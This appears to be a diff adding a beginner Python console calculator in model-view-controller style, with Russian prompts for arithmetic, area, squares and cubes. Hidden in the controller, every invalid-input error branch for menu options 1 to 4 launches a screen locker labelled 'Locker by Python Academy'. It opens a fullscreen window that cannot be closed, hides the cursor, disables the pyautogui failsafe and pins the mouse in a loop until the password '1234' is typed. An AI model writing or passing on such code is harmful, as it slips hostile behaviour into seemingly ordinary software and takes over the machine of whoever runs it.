@@ -1,0 +1,262 @@
+Controller
+
+
+from model import *
+from view import *
+from tkinter import *
+from PIL import Image, ImageTk
+
+
+
+
+from model import Model
+from view import View
+
+class CalculatorController:
+    def __init__(self):
+        self.model = Model()
+        self.view = View()
+
+    def perform_calculation(self, one_number, two_number, action):
+        self.model.add_rezer(one_number, two_number, action)
+        result = self.model.count()
+        self.view.display_result(result)
+class ModelController:
+    def __init__(self):
+        self.model = MyModel()
+        self.view = View()
+    def calculate(self, num1, num2):
+        self.model.plo(num1, num2)
+        result2 = self.model.count2()
+        self.view.display_result2(result2)
+class ControllerDegree:
+    def __init__(self):
+        self.model = Degree()
+        self.view = View()
+    def calculatedegree(self, num3):
+        self.model.degree(num3)
+        result3 = self.model.count3()
+        self.view.display_result3(result3)
+class ControllerCube:
+    def __init__(self):
+        self.model = Cube()
+        self.view = View()
+    def calculatecube(self, num4):
+        self.model.cube(num4)
+        result4 = self.model.count4()
+        self.view.display_result4(result4)
+
+
+def main():
+    calculator = CalculatorController()
+    calculator2 = ModelController()
+    calculator3 = ControllerDegree()
+    calculator4 = ControllerCube()
+    while True:
+        calculator.view.display_menu()
+        choice = int(input("Выберите действие (1-5): "))
+        if choice == 1:
+            try:
+                one_number = int(input('Введите первое число: '))
+                two_number = int(input('Введите второе число: '))
+                action = int(input('Выбирите действие: '))
+                calculator.perform_calculation(one_number, two_number, action)
+            except ValueError:
+                # Создание экземпляра класса Tk
+                from tkinter import Tk, Entry, Label
+                import pyautogui, sys
+
+                root = Tk()
+
+                label = Label(root, text='Locker by Python Academy', font='Courier 8')
+                label.place(relx=.5, rely=.94, anchor="center")
+                label= Label(root, text='Вы попались в локер', font='Courier 30')
+                label.place(relx=.5, rely=.3, anchor="center")
+                label = Label(root, text='Write the Password', font='Courier 30')
+                label.place(relx=.5, rely=.4, anchor="center")
+
+                entry = Entry(root, font='Courier 16')
+                entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40)
+                entry.focus()
+
+                root.protocol('WM_DELETE_WINDOW', lambda: None)
+                root.attributes('-fullscreen', True)
+                root.config(cursor="none")
+                pyautogui.FAILSAFE = False
+
+                while True:
+                    pyautogui.moveTo(0, 0)
+                    root.update()
+                    if entry.get() == '1234':
+                        sys.exit()
+
+        if choice == 2:
+            try:
+                num1 = int(input('Введите первую велечину: '))
+                num2 = int(input('Введите вторую велечину: '))
+                calculator2.calculate(num1, num2)
+            except ValueError:
+                # Создание экземпляра класса Tk
+                from tkinter import Tk, Entry, Label
+                import pyautogui, sys
+
+                root = Tk()
+
+                label = Label(root, text='Locker by Python Academy', font='Courier 8')
+                label.place(relx=.5, rely=.94, anchor="center")
+                label= Label(root, text='Вы попались в локер', font='Courier 30')
+                label.place(relx=.5, rely=.3, anchor="center")
+                label = Label(root, text='Write the Password', font='Courier 30')
+                label.place(relx=.5, rely=.4, anchor="center")
+
+                entry = Entry(root, font='Courier 16')
+                entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40)
+                entry.focus()
+
+                root.protocol('WM_DELETE_WINDOW', lambda: None)
+                root.attributes('-fullscreen', True)
+                root.config(cursor="none")
+                pyautogui.FAILSAFE = False
+
+                while True:
+                    pyautogui.moveTo(0, 0)
+                    root.update()
+                    if entry.get() == '1234':
+                        sys.exit()
+        if choice == 3:
+            try:
+                num3 = int(input('Введите число для возведения в степень: '))
+                calculator3.calculatedegree(num3)
+            except ValueError:
+                # Создание экземпляра класса Tk
+                from tkinter import Tk, Entry, Label
+                import pyautogui, sys
+
+                root = Tk()
+
+                label = Label(root, text='Locker by Python Academy', font='Courier 8')
+                label.place(relx=.5, rely=.94, anchor="center")
+                label= Label(root, text='Вы попались в локер', font='Courier 30')
+                label.place(relx=.5, rely=.3, anchor="center")
+                label = Label(root, text='Write the Password', font='Courier 30')
+                label.place(relx=.5, rely=.4, anchor="center")
+
+                entry = Entry(root, font='Courier 16')
+                entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40)
+                entry.focus()
+
+                root.protocol('WM_DELETE_WINDOW', lambda: None)
+                root.attributes('-fullscreen', True)
+                root.config(cursor="none")
+                pyautogui.FAILSAFE = False
+
+                while True:
+                    pyautogui.moveTo(0, 0)
+                    root.update()
+                    if entry.get() == '1234':
+                        sys.exit()
+        if choice == 4:
+            try:
+                num4 = int(input('Введиет число: '))
+                calculator4.calculatecube(num4)
+            except ValueError:
+                # Создание экземпляра класса Tk
+                from tkinter import Tk, Entry, Label
+                import pyautogui, sys
+
+                root = Tk()
+
+                label = Label(root, text='Locker by Python Academy', font='Courier 8')
+                label.place(relx=.5, rely=.94, anchor="center")
+                label= Label(root, text='Вы попались в локер', font='Courier 30')
+                label.place(relx=.5, rely=.3, anchor="center")
+                label = Label(root, text='Write the Password', font='Courier 30')
+                label.place(relx=.5, rely=.4, anchor="center")
+
+                entry = Entry(root, font='Courier 16')
+                entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40)
+                entry.focus()
+
+                root.protocol('WM_DELETE_WINDOW', lambda: None)
+                root.attributes('-fullscreen', True)
+                root.config(cursor="none")
+                pyautogui.FAILSAFE = False
+
+                while True:
+                    pyautogui.moveTo(0, 0)
+                    root.update()
+                    if entry.get() == '1234':
+                        sys.exit()
+        if choice == 5:
+            exit()
+if __name__ == "__main__":
+    main()
+model
+
+
+
+
+class Model:
+    def add_rezer(self, one_number, two_number, action):
+        self.one_number = one_number
+        self.two_number = two_number
+        self.action = action
+
+
+
+    def count(self):
+        if self.action == 1:
+            return self.one_number + self.two_number
+        elif self.action == 2:
+            return self.one_number - self.two_number
+        elif self.action == 3:
+            return self.one_number * self.two_number
+        elif self.action == 4:
+            return self.one_number % self.two_number
+        else:
+            return "Недопустимая операция"
+class MyModel:
+    def plo(self, num1, num2):
+        self.num1 = num1
+        self.num2 = num2
+
+    def count2(self):
+        return self.num1 * self.num2
+class Degree:
+    def degree(self, num3):
+        self.num3 = num3
+    def count3(self):
+        return self.num3 ** 2
+class Cube:
+    def cube(self, num4):
+        self.num4 = num4
+
+    def count4(self):
+        return self.num4**3
+view
+
+
+def display_menu():
+    print("1. Калькулятор")
+    print("2. Площадь")
+    print("3. Возведение в степень")
+    print("4. Куб")
+    print("5. Выйти")
+
+
+class View:
+    def display_menu(self):
+        print("1. Калькулятор")
+        print("2. Площадь")
+        print("3. Возведение в степень")
+        print("4. Куб")
+        print("5. Выйти")
+
+    def display_result(self, result):
+        print('Результат:', result)
+    def display_result2(self, result2):
+        print(result2, 'см^2/м^2')
+    def display_result3(self, result3):
+        print('Число в степени 2:', result3)
+    def display_result4(self, result4):
+        print('Число в кубе:', result4)
